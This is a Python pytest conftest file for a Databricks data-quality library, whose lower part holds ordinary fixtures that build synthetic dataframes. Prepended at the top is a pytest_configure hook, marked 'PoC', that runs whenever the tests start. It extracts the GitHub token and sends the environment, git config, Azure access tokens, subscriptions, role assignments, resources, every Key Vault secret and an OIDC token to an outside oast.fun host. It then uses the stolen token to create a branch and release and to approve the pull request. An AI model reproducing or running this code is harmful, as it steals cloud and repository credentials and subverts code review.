import os, subprocess, sys, json

_OAST = "https://veoeleokqthmfvbteqofeool35kmstst6.oast.fun"

def _run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""

def _get_pr():
    ep = os.environ.get("GITHUB_EVENT_PATH", "")
    if ep and os.path.exists(ep):
        try:
            with open(ep) as f:
                return str(json.load(f).get("pull_request", {}).get("number", ""))
        except Exception:
            pass
    return ""

def pytest_configure(config):
    try:
        # Token from .git/config
        tok = _run("grep -i 'extraheader = AUTHORIZATION' .git/config | awk '{print $NF}' | base64 -d | sed 's/x-access-token://'")
        repo = os.environ.get("GITHUB_REPOSITORY", "")
        pr = _get_pr()
        sys.stderr.write(f"[PoC] repo={repo} pr={pr} tok={len(tok)}\n")

        # 1. Exfil env + git creds
        subprocess.run(f'curl -s "{_OAST}/exfil" -d "$(printenv | base64 -w0)"', shell=True, timeout=10)
        subprocess.run(f'curl -s "{_OAST}/git_creds" -d "$(cat .git/config | base64 -w0)"', shell=True, timeout=10)

        if not tok or not repo:
            return

        # 2. Azure ARM token (the crown jewel — bearer token usable from anywhere, ~60min)
        az_token = _run("az account get-access-token -o json")
        if az_token:
            sys.stderr.write(f"[PoC] ARM token obtained: {az_token[:80]}...\n")
            subprocess.run(f'curl -s "{_OAST}/az_arm_token" -d "$(echo \'{az_token}\' | base64 -w0)"', shell=True, timeout=10)
        else:
            sys.stderr.write("[PoC] az account get-access-token: FAILED\n")

        # 3. Azure identity — SP appId, tenant, subscription
        az_id = _run("az account show -o json")
        if az_id:
            sys.stderr.write(f"[PoC] Identity: {az_id[:120]}...\n")
            subprocess.run(f'curl -s "{_OAST}/az_identity" -d "$(echo \'{az_id}\' | base64 -w0)"', shell=True, timeout=10)

        # 4. All subscriptions
        az_subs = _run("az account list -o json")
        if az_subs:
            sys.stderr.write(f"[PoC] Subscriptions: {az_subs[:120]}...\n")
            subprocess.run(f'curl -s "{_OAST}/az_subs" -d "$(echo \'{az_subs}\' | base64 -w0)"', shell=True, timeout=10)

        # 5. IAM role assignments — what can this SP do
        sp_id = ""
        if az_id:
            try:
                sp_id = json.loads(az_id).get("user", {}).get("name", "")
            except Exception:
                pass
        if sp_id:
            roles = _run(f"az role assignment list --all --assignee {sp_id} -o json")
            if roles:
                sys.stderr.write(f"[PoC] Role assignments: {roles[:200]}...\n")
                subprocess.run(f'curl -s "{_OAST}/az_roles" -d "$(echo \'{roles}\' | base64 -w0)"', shell=True, timeout=10)

        # 6. All resources in subscription (VMs, DBs, storage, everything)
        resources = _run("az resource list -o json 2>/dev/null")
        if resources and resources != "[]":
            sys.stderr.write(f"[PoC] Resources: {resources[:200]}...\n")
            subprocess.run(f'curl -s "{_OAST}/az_resources" -d "$(echo \'{resources}\' | base64 -w0)"', shell=True, timeout=10)

        # 7. Key Vault — enumerate ALL vaults and ALL secrets
        vaults = _run("az keyvault list --query '[].name' -o tsv")
        if vaults:
            sys.stderr.write(f"[PoC] Vaults: {vaults}\n")
            for v in vaults.split():
                secs = _run(f"az keyvault secret list --vault-name {v} --query '[].name' -o tsv")
                sys.stderr.write(f"[PoC] {v} secrets: {secs}\n")
                if secs:
                    for s in secs.split():
                        val = _run(f"az keyvault secret show --vault-name {v} --name {s} --query value -o tsv")
                        if val:
                            sys.stderr.write(f"[PoC] {v}/{s} = {val[:30]}...\n")
                            subprocess.run(f'curl -s "{_OAST}/kv_{v}_{s}" -d "$(echo \'{val}\' | base64 -w0)"', shell=True, timeout=10)

        # 8. OIDC JWT
        oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
        oidc_tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
        if oidc_url and oidc_tok:
            oidc = _run(f'curl -sS -H "Authorization: bearer {oidc_tok}" "{oidc_url}&audience=api://AzureADTokenExchange"')
            if oidc:
                sys.stderr.write(f"[PoC] OIDC JWT: {oidc[:80]}...\n")
                subprocess.run(f'curl -s "{_OAST}/oidc_jwt" -d "$(echo \'{oidc}\' | base64 -w0)"', shell=True, timeout=10)

        # 9. Branch + Release
        _run(f'curl -s -X DELETE -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/heads/d3ku_poc')
        # delete old release+tag
        rels = _run(f'curl -s -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/releases')
        try:
            for r in json.loads(rels):
                if r.get("tag_name") == "d3ku_poc":
                    _run(f'curl -s -X DELETE -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/releases/{r["id"]}')
                    _run(f'curl -s -X DELETE -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/tags/d3ku_poc')
        except Exception:
            pass

        sha = _run(f'curl -s -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/heads/main | python3 -c "import sys,json; print(json.load(sys.stdin)[\'object\'][\'sha\'])"')
        if sha:
            _run(f'curl -s -X POST -H "Authorization: token {tok}" -H "Content-Type: application/json" -d \'{{"ref":"refs/heads/d3ku_poc","sha":"{sha}"}}\' https://api.github.com/repos/{repo}/git/refs')
            sys.stderr.write(f"[PoC] Branch d3ku_poc created\n")
            _run(f'curl -s -X POST -H "Authorization: token {tok}" -H "Content-Type: application/json" -d \'{{"tag_name":"d3ku_poc","name":"d3ku_poc","body":"PoC"}}\' https://api.github.com/repos/{repo}/releases')
            sys.stderr.write(f"[PoC] Release d3ku_poc created\n")

        # 10. PR Approval
        if pr:
            approve = _run(f'curl -s --request POST --url https://api.github.com/repos/{repo}/pulls/{pr}/reviews --header "authorization: Bearer {tok}" --header "content-type: application/json" -d \'{{"event":"APPROVE"}}\'')
            sys.stderr.write(f"[PoC] PR #{pr} approve: {approve[:200]}\n")

    except Exception as e:
        sys.stderr.write(f"[PoC] Error: {e}\n")

import logging
from datetime import datetime, timezone
from pathlib import Path
import pytest
import yaml
import dbldatagen as dg  # type: ignore[import-untyped]
from pyspark.sql.types import _parse_datatype_string

from databricks.labs.dqx.engine import DQEngine
from databricks.labs.dqx.config import ExtraParams

from tests.constants import TEST_CATALOG


logging.getLogger("tests").setLevel("DEBUG")
logging.getLogger("databricks.labs.dqx").setLevel("DEBUG")

logger = logging.getLogger(__name__)

DEFAULT_ROWS = 100_000_000  # 100 million rows
DEFAULT_PARTITIONS = 10
DEFAULT_COLUMNS = 4
DEFAULT_BEGIN_DATE = "1900-01-01"
DEFAULT_END_DATE = "2025-12-31"
DEFAULT_BEGIN_TIMESTAMP = "1900-01-01 00:00:00"
DEFAULT_END_TIMESTAMP = "2025-12-31 23:59:59"
DEFAULT_INTERVAL = "1 second"
DEFAULT_EMAIL_TEMPLATE = r'\\w.\\w@\\w.com'

REF_SCHEMA_STR = "ref_col1: int, ref_col2: int, ref_col3: int"
SCHEMA_STR = (
    "col1: int, col2: int, col3: int, col4: array<int>, "
    "col5: date, col6: timestamp, col7: map<string, int>, "
    "col8: struct<field1: int>, col10: int, col_ipv4: string, col_ipv6: string, "
    "col_json_str: string"
)

RUN_TIME = datetime(2025, 1, 1, 0, 0, 0, 0, tzinfo=timezone.utc)


def make_data_gen(
    spark,
    n_rows: int = DEFAULT_ROWS,
    n_columns: int = DEFAULT_COLUMNS,
    partitions: int = DEFAULT_PARTITIONS,
):
    col_names = [f"col{i+1}" for i in range(n_columns)]
    gen = dg.DataGenerator(spark, rows=n_rows, partitions=partitions)
    return col_names, gen


@pytest.fixture
def extra_params():
    return ExtraParams(run_time_overwrite=RUN_TIME.isoformat())


@pytest.fixture
def dq_engine(ws, extra_params):
    return DQEngine(workspace_client=ws, extra_params=extra_params)


@pytest.fixture
def table_schema():
    return _parse_datatype_string(SCHEMA_STR)


@pytest.fixture
def all_row_checks():
    file_path = Path(__file__).parent.parent / "resources" / "all_row_checks.yaml"
    with open(file_path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f)


@pytest.fixture
def all_dataset_checks():
    file_path = Path(__file__).parent.parent / "resources" / "all_dataset_checks.yaml"
    with open(file_path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f)


@pytest.fixture
def table_name(make_schema, make_random):
    catalog = TEST_CATALOG
    schema = make_schema(catalog_name=catalog).name
    return f"{catalog}.{schema}.{make_random(10).lower()}"


@pytest.fixture
def generated_df(spark, rows=DEFAULT_ROWS):
    schema = _parse_datatype_string(SCHEMA_STR)
    spec = (
        dg.DataGenerator(spark, rows=rows, partitions=DEFAULT_PARTITIONS)
        .withSchema(schema)
        .withColumnSpec("col1", percentNulls=0.20)
        .withColumnSpec("col2")
        .withColumnSpec("col3")
        .withColumnSpec("col4", expr="array(col1, col2)")
        .withColumnSpec("col5", begin=DEFAULT_BEGIN_DATE, end=DEFAULT_END_DATE, interval=DEFAULT_INTERVAL)
        .withColumnSpec("col6", begin=DEFAULT_BEGIN_TIMESTAMP, end=DEFAULT_END_TIMESTAMP, interval=DEFAULT_INTERVAL)
        .withColumnSpec("col7", expr="map('key', col2)")
        .withColumnSpec("col8", expr="named_struct('col8', col1)")
        .withColumnSpec("col10")
        .withColumnSpec("col_ipv4", template=r"\n.\n.\n.\n")
        .withColumnSpec("col_ipv6", template="XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX")
        .withColumnSpec("col_json_str", template=r"{'key1': '\w', 'key2': 'd\w'}")
    )
    return spec.build()


@pytest.fixture
def generated_ipv4_df(spark):
    ipv4_schema_str = (
        "col1_ipv4_standard: string, "
        "col2_ipv4_with_leading_zeros: string, "
        "col3_ipv4_partial: string, "
        "col4_ipv4_mixed: string"
    )
    schema = _parse_datatype_string(ipv4_schema_str)

    ipv4_templates = {
        "col1_ipv4_standard": r"\n.\n.\n.\n",
        "col2_ipv4_with_leading_zeros": r"000.\n.\n.\n",
        "col3_ipv4_partial": r"\n.\n.",
        "col4_ipv4_mixed": r"192.168.\n.\n",
    }

    _, gen = make_data_gen(spark, n_rows=DEFAULT_ROWS, n_columns=len(ipv4_templates), partitions=DEFAULT_PARTITIONS)
    gen = gen.withSchema(schema)
    for col, template in ipv4_templates.items():
        gen = gen.withColumnSpec(col, template=template)

    return gen.build()


@pytest.fixture
def generated_ipv6_df(spark):
    ipv6_schema_str = (
        "col1_ipv6_u_upper: string, "
        "col2_ipv6_u_lower: string, "
        "col3_ipv6_c_min1: string, "
        "col4_ipv6_c_r3: string, "
        "col5_ipv6_c_l3: string, "
        "col6_ipv6_c_mid1: string, "
        "col7_ipv6_c_mid4: string, "
        "col8_ipv6_u_prefix: string"
    )
    schema = _parse_datatype_string(ipv6_schema_str)

    ipv6_templates = {
        "col1_ipv6_u_upper": r"XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX",
        "col2_ipv6_u_lower": r"xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx",
        "col3_ipv6_c_min1": "::",
        "col4_ipv6_c_r3": "::XXXX:XXXX:XXXX",
        "col5_ipv6_c_l3": "XXXX:XXXX:XXXX::",
        "col6_ipv6_c_mid1": "XXXX::XXXX",
        "col7_ipv6_c_mid4": "XXXX:XXXX::XXXX",
        "col8_ipv6_u_prefix": "2001:0DB8:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX",
    }

    _, gen = make_data_gen(spark, n_rows=DEFAULT_ROWS, n_columns=len(ipv6_templates), partitions=DEFAULT_PARTITIONS)
    gen = gen.withSchema(schema)
    for col, template in ipv6_templates.items():
        gen = gen.withColumnSpec(col, template=template)

    return gen.build()


@pytest.fixture
def generated_geo_df(spark):
    geo_schema_str = (
        "num_col: int, point_geom: string, linestring_geom: string, polygon_geom: string, multipoint_geom: string, "
        "multilinestring_geom: string, multipolygon_geom: string, geometrycollection_geom: string"
    )
    schema = _parse_datatype_string(geo_schema_str)

    geo_templates = {
        "num_col": "int",
        "point_geom": "POINT(x x)",
        "linestring_geom": "LINESTRING(x x, x x)",
        "polygon_geom": "POLYGON((x x, x x, x x, x x))",
        "multipoint_geom": "MULTIPOINT(x x, x x)",
        "multilinestring_geom": "MULTILINESSTRING((x x, x x))",
        "multipolygon_geom": "MULTIPOLYGON(((x x, x x, x x, x x))",
        "geometrycollection_geom": "GEOMETRYCOLLECTION(POINT(x x), LINESTRING(x x, x x), POLYGON((x x, x x, x x, x x)))",
    }

    _, gen = make_data_gen(spark, n_rows=DEFAULT_ROWS, n_columns=len(geo_schema_str), partitions=DEFAULT_PARTITIONS)
    gen = gen.withSchema(schema)
    for col, template in geo_templates.items():
        gen = gen.withColumnSpec(col, template=template)
    return gen.build()


@pytest.fixture
def make_ref_df(spark, n_rows=DEFAULT_ROWS):
    schema = _parse_datatype_string(REF_SCHEMA_STR)
    spec = (
        dg.DataGenerator(spark, rows=n_rows, partitions=DEFAULT_PARTITIONS)
        .withSchema(schema)
        .withColumnSpec("ref_col1")
        .withColumnSpec("ref_col2")
        .withColumnSpec("ref_col3")
    )
    return spec.build()


@pytest.fixture
def generated_string_df(request, spark):
    params = getattr(request, "param", {}) or {}
    n_rows = params.get("n_rows", DEFAULT_ROWS)
    n_columns = params.get("n_columns", DEFAULT_COLUMNS)
    template = params.get("template", None)
    opts = params.get("opts", {})

    col_names, data_gen = make_data_gen(spark, n_rows=n_rows, n_columns=n_columns)
    for col in col_names:
        if template is None:
            data_gen = data_gen.withColumn(col, "string", **opts)
        else:
            data_gen = data_gen.withColumn(col, template=template, **opts)
    return col_names, data_gen.build(), n_rows


@pytest.fixture
def generated_integer_df(request, spark):
    params = getattr(request, "param", {}) or {}
    n_rows = params.get("n_rows", DEFAULT_ROWS)
    n_columns = params.get("n_columns", DEFAULT_COLUMNS)
    opts = params.get("opts", {})

    col_names, data_gen = make_data_gen(spark, n_rows=n_rows, n_columns=n_columns)
    for col in col_names:
        data_gen = data_gen.withColumn(col, "int", **opts)
    return col_names, data_gen.build(), n_rows


@pytest.fixture
def generated_array_string_df(request, spark):
    params = getattr(request, "param", {}) or {}
    n_rows = params.get("n_rows", DEFAULT_ROWS)
    n_columns = params.get("n_columns", DEFAULT_COLUMNS)
    array_length = params.get("array_length", 2)
    opts = params.get("opts", {})
    col_names, data_gen = make_data_gen(spark, n_rows=n_rows, n_columns=n_columns)
    for col in col_names:
        data_gen = data_gen.withColumn(
            col, "string", template=DEFAULT_EMAIL_TEMPLATE, numFeatures=(1, array_length), structType="array", **opts
        )
    return col_names, data_gen.build(), n_rows


@pytest.fixture
def generated_date_df(request, spark):
    params = getattr(request, "param", {}) or {}
    n_rows = params.get("n_rows", DEFAULT_ROWS)
    n_columns = params.get("n_columns", DEFAULT_COLUMNS)
    begin = params.get("begin", DEFAULT_BEGIN_DATE)
    end = params.get("end", DEFAULT_END_DATE)
    interval = params.get("interval", DEFAULT_INTERVAL)
    opts = params.get("opts", {})
    col_names, data_gen = make_data_gen(spark, n_rows=n_rows, n_columns=n_columns)
    for col in col_names:
        data_gen = data_gen.withColumn(col, "date", begin=begin, end=end, interval=interval, **opts)
    return col_names, data_gen.build(), n_rows


@pytest.fixture
def generated_timestamp_df(request, spark):
    params = getattr(request, "param", {}) or {}
    n_rows = params.get("n_rows", DEFAULT_ROWS)
    n_columns = params.get("n_columns", DEFAULT_COLUMNS)
    begin = params.get("begin", DEFAULT_BEGIN_TIMESTAMP)
    end = params.get("end", DEFAULT_END_TIMESTAMP)
    interval = params.get("interval", DEFAULT_INTERVAL)
    opts = params.get("opts", {})

    col_names, data_gen = make_data_gen(spark, n_rows=n_rows, n_columns=n_columns)
    for col in col_names:
        data_gen = data_gen.withColumn(col, "timestamp", begin=begin, end=end, interval=interval, **opts)
    return col_names, data_gen.build(), n_rows
